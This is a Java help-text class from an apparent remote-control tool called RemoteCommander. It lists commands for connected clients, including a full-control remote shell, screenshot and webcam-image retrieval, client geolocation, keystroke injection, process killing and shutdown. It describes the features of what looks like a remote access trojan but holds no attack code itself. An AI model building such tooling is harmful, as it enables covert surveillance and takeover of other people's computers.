package com.github.connorf.RemoteCommander;

import static com.github.connorf.RemoteCommander.CommandConstants.*;

/**
 * provides help when the help command is run
 */
public abstract class Help
{
    /**
     * prints out help messages
     * @param command can be either a specific command e.g. eject or `null`. If a specified command is detailed help
     *                is shown for that command, if `null` is given, brief help for all commands is printed
     */
    public static void printHelp(String command)
    {
        if(command == null) // user wants full, brief help
            System.out.println("Usage:\n\t" + CMD_COUNT + "\n\t" + CMD_ONLINE + "\n\t" + CMD_HELP + "\n\t" + CMD_REMOTE_SHELL + " HOST\n\t" + CMD_SYSINFO + " HOST\n\t" + CMD_MINIMISE + " HOST\n\t" + CMD_LIST_PROCESSES + " HOST\n\t" + CMD_EJECT + " HOST\n\t" + CMD_SHUTDOWN + " HOST\n\t" + CMD_RESTART + " HOST\n\t" + CMD_SCREENSHOT + " HOST\n\t" + CMD_SOUND + " HOST /path/to/local/sound/file\n\t" + CMD_WALLPAPER + " HOST /path/to/local/image/file\n\t" + CMD_ROTATE + " HOST ORIENTATION\n\t" + CMD_MSG + " \"message body\" \"message box title\" type\n\t" + CMD_KILL_PROCESS + " HOST TYPE ARG\n\t" + CMD_CHAOS + " HOST DURATION DELAY\n\t" + CMD_TYPE + " HOST \"message to type here\"\nHOST can either be a specified IP address or the word all (to send to every online client)");
        else
        {
            if(command.equals(CMD_COUNT))
                System.out.println(CMD_COUNT + " displays the number of currently connected clients.\nExample usage:\n\t" + CMD_COUNT);
            else if(command.equals(CMD_ONLINE))
                System.out.println(CMD_ONLINE + " displays info about each of the connected clients, this includes their IP address and geolocation.\nExample usage:\n\t" + CMD_ONLINE);
            else if(command.equals(CMD_EJECT))
                System.out.println(CMD_EJECT + " will eject the disk / disk tray on the client.\nExample usage:\n\t" + CMD_EJECT + " 127.0.0.1");
            else if(command.equals(CMD_SHUTDOWN))
                System.out.println(CMD_SHUTDOWN + " will turn off the clients computer.\nExample usage:\n\t" + CMD_SHUTDOWN + " 127.0.0.1");
            else if(command.equals(CMD_RESTART))
                System.out.println(CMD_RESTART + " will restart the clinets computer.\nExample usage:\n\t" + CMD_RESTART + " 127.0.0.1");
            else if(command.equals(CMD_SCREENSHOT))
                System.out.println(CMD_SCREENSHOT + " will take a screenshot of the clients screen.\nExample usage:\n\t" + CMD_SCREENSHOT + " 127.0.0.1");
            else if(command.equals(CMD_SOUND))
                System.out.println(CMD_SOUND + " will play a sound on the clients computer.\nExample usage:\n\t" + CMD_SOUND + " 127.0.0.1 /path/to/local/sound/file");
            else if(command.equals(CMD_MSG))
                System.out.println(CMD_MSG + " will send a message that will be displayed as a message box on the clients computer.\nExample usage:\n\t" + CMD_MSG + " 127.0.0.1 \"message body\" \"title of the message box\" type\ntype can be any of the following: error, info, warning");
            else if(command.equals(CMD_CHAOS))
                System.out.println(CMD_CHAOS + " will randomly press keys, move the mouse and click the mouse buttons on the clients computer.\nExample usage:\n\t" + CMD_CHAOS + " 127.0.0.1 DURATION DELAY\nDURATION is the time in ms for the chaos to last\nDELAY is the time in ms between each random act of chaos");
            else if(command.equals(CMD_TYPE))
                System.out.println(CMD_TYPE + " will type the provided message on the clients computer.\nExample usage:\n\t" + CMD_TYPE + " 127.0.0.1 \"this is will get typed out\"");
            else if(command.equals(CMD_RETRIEVE))
                System.out.println(CMD_RETRIEVE + " will get all the screenshots/webcam images taken on the clients computer and transfer them to the server.\nExample usage:\n\t" + CMD_RETRIEVE + " 127.0.0.1");
            else if(command.equals(CMD_SYSINFO))
                System.out.println(CMD_SYSINFO + " will return the client's operating system.\nExample usage:\n\t" + CMD_SYSINFO + " 127.0.0.1");
            else if(command.equals(CMD_ROTATE))
                System.out.println(CMD_ROTATE + " will rotate the clients screen depending on the supplied rotation.\nExample usage:\n\t" + CMD_ROTATE + " 127.0.0.1 ORIENTATION\nORIENTATION can be either: left, right, up, down");
            else if(command.equals(CMD_WALLPAPER))
                System.out.println(CMD_WALLPAPER + " will change the clients desktop wallpaper image.\nExample usage:\n\t" + CMD_WALLPAPER + " 127.0.0.1 /path/to/local/image/file");
            else if(command.equals(CMD_MINIMISE))
                System.out.println(CMD_MINIMISE + " will minimise all open applications on the clients machine.\nExample usage:\n\t" + CMD_MINIMISE + " 127.0.0.1");
            else if(command.equals(CMD_LIST_PROCESSES))
                System.out.println(CMD_LIST_PROCESSES + " will list all running processes on the clients machine.\nExample usage:\n\t" + CMD_LIST_PROCESSES + " 127.0.0.1");
            else if(command.equals(CMD_KILL_PROCESS))
                System.out.println(CMD_KILL_PROCESS + " will kill the process on the clients machine.\nExample usage:\n\t" + CMD_KILL_PROCESS + " 127.0.0.1 TYPE ARG\nTYPE can either be pid (process id) or name\nARG must be a valid process id if using the TYPE pid or a valid process name if using the TYPE name");
            else if(command.equals(CMD_REMOTE_SHELL))
                System.out.println(CMD_REMOTE_SHELL + " will start a remote shell session on the server, the shell is the shell on the clients computer, allowing for full control of the clients computer.\nExample usage:\n\t" + CMD_REMOTE_SHELL + " 127.0.0.1");
        }
    }
}